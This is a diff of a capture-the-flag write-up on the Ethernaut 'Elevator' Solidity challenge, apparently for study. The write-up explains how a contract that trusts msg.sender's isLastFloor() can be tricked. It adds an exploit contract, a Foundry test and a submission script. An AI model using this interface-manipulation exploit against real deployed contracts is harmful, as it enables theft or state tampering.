@@ -1,4 +1,4 @@
-## Elevator
+## 👾 Elevator
 
 <br>
 
@@ -8,7 +8,16 @@
 <br>
 
 
-* this challenge explores vulnerabilities that might come from smart contract composability (usually classified into **ERC standards**, **libraries**, and **interfaces**). 
+* this challenge explores vulnerabilities in smart contract composability (usually classified into **ERC standards**, **libraries**, and **interfaces**). 
+
+<br>
+
+* more specifically, the lesson in this challenge is to **be careful when using interfaces** (or other contracts), as they introduce an attack surface to any re-implementable function (and `view` or `pure` modifiers cannot be treated as guarantees for function behavior).
+  - **[remember that an `interface`](https://solidity-by-example.org/interface/)** cannot have any functions implemented, declare a constructor, declare state variables, and all functions must be external.
+
+<br>
+
+* in addition, another takeaway is to refrain from giving permissions to `msg.sender` to implement interfaces or modify the storage and state of your contract (unless explicitly required).
 
 
 
@@ -53,9 +62,7 @@ contract Elevator {
 <br>
 
 * the contract starts with an `interface` containing an `external` function that returns a `bool` if `isLastFloor()`. 
-  - note that `external` allows a change of state (an alternative is `view`, which doesn't allow modification of the state of the contract).
-
-<br>
+  - note that `external` allows a state change (an alternative is `view`, which doesn't allow modification of the state of the contract).
 
 
 ```solidity
@@ -63,6 +70,22 @@ interface Building {
   function isLastFloor(uint) external returns (bool);
 }
 ```
+
+<br>
+
+* now, let's look at the `Elevator` contract, where we already see a mistake in the very definition:
+
+
+```solidity
+contract Elevator {...}
+```
+
+should be, instead,
+
+```solidity
+contract Elevator is Building {...} 
+```
+
 
 <br>
 
@@ -76,21 +99,19 @@ uint public floor;
 
 <br>
 
-* finally, there is one (`public`) function, which simulates the movement of the elevator by first initiating the `building` contract (with the data provided by `msg.sender`) and then taking a `uint _floor` as input representation for "which floor to go",
-  - this challenge's vulnerability is found in this part, due to the unchecked assumption about the caller.
+* finally, there is one (`public`) function, which simulates the movement of the elevator by first initiating the `building` contract (with the data provided by `msg.sender`) and then taking `uint _floor`. this challenge's vulnerability is found in this part, due to the unchecked assumption about the caller:
 
-<br>
 
 ```solidity
 function goTo(uint _floor) public {
     Building building = Building(msg.sender);
+}
 ```
 
 <br>
 
 * if the given floor number is not the last, fill both in variables `floor` and `top`:
 
-<br>
 
 
 ```solidity
@@ -116,7 +137,6 @@ function goTo(uint _floor) public {
 * an exploit could be crafted with `contract.call(abi.encodeWithSignature("goTo(uint)", 0))`. 
   - however, since we are leveraging foundry, we craft the following exploit:
 
-<br>
 
 ```solidity
 contract ElevatorExploit is Building {
@@ -133,8 +153,7 @@ contract ElevatorExploit is Building {
     }
 
     function run(Elevator level) public {
-        // go to random floor 10
-        level.goTo(10);
+        level.goTo(1337);
     }
 }
 ```
@@ -142,14 +161,57 @@ contract ElevatorExploit is Building {
 
 <br>
 
-* which can be submitted with `script/11/Elevator.s.sol`:
+* which can be tested with `test/11.Elevator.t.sol`:
 
 <br>
 
 ```solidity
+contract ElevatorTest is Test {
+
+    Elevator public level = new Elevator();
+
+    address instance = payable(vm.addr(0x10053)); 
+    address hacker = vm.addr(0x1337); 
+
+    function setUp() public {
+
+        vm.prank(instance);
+        
+    }
+
+    function testElevatorHack() public {
+
+        vm.startPrank(hacker);
+
+        ElevatorExploit exploit = new ElevatorExploit();
+        exploit.run(level);
+        assert(level.top());
+
+        vm.stopPrank();
+        
+    }
+}
+```
+
+<br>
+
+* by running:
+
+```shell
+forge test --match-contract ElevatorTest -vvvv
+```
+
+<br>
+
+* and submitted with `script/11/Elevator.s.sol`:
+
+<br>
+
+
+```solidity
 contract Exploit is Script {
 
-        address instance = 0x3438a48A2b1d4452113a06A131F8e3Fd568E7A78;
+        address instance = vm.envAddress("INSTANCE_LEVEL11");
         address hacker = vm.envAddress("PUBLIC_KEY");
 
         Elevator level = Elevator(instance);        
